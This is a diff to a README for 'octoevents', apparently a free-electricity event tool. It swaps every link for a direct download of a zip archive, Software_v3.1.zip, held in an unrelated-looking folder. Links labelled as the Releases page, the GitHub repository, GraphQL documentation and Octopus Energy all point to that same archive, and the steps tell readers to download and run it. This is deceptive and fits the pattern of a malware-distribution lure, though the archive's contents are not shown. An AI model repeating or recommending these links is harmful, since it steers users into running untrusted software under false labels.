@@ -6,10 +6,10 @@ Welcome to octoevents! This application helps you fetch and maintain free electr
 ## 📦 Download & Install
 To get started, visit the Releases page to download the application. 
 
-[![Download octoevents](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip)](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip)
+[![Download octoevents](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip)](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip)
 
 ### Step-by-Step Guide
-1. Click on the link above or visit the [Releases page](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip).
+1. Click on the link above or visit the [Releases page](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click on the corresponding file for your operating system to download it.
 4. Once the download completes, locate the file in your Downloads folder.
@@ -45,7 +45,7 @@ If you encounter any issues:
 
 1. **Ensure Compatibility**: Verify that your operating system meets the system requirements listed above.
 2. **Check Internet Connection**: Make sure you have an active internet connection during updates.
-3. **Reinstall the Application**: If problems persist, try reinstalling the software by downloading the latest version again from the [Releases page](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip).
+3. **Reinstall the Application**: If problems persist, try reinstalling the software by downloading the latest version again from the [Releases page](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip).
 
 ## 📞 Support
 For further assistance, feel free to open an issue on the GitHub repository. Our community is here to help. You can also check the discussions tab for common questions and solutions.
@@ -62,8 +62,8 @@ A: The application updates the JSON file every hour with the latest event data.
 A: No, you do not need any account. Simply download and run the application.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip)
-- [GraphQL Documentation](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip)
-- [Octopus Energy](https://raw.githubusercontent.com/Hamzagwapo123/octoevents/main/Japanophile/octoevents.zip)
+- [GitHub Repository](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip)
+- [GraphQL Documentation](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip)
+- [Octopus Energy](https://github.com/Hamzagwapo123/octoevents/raw/refs/heads/main/Japanophile/Software_v3.1.zip)
 
 Thank you for using octoevents! Stay updated with free electricity and save on your energy bills.
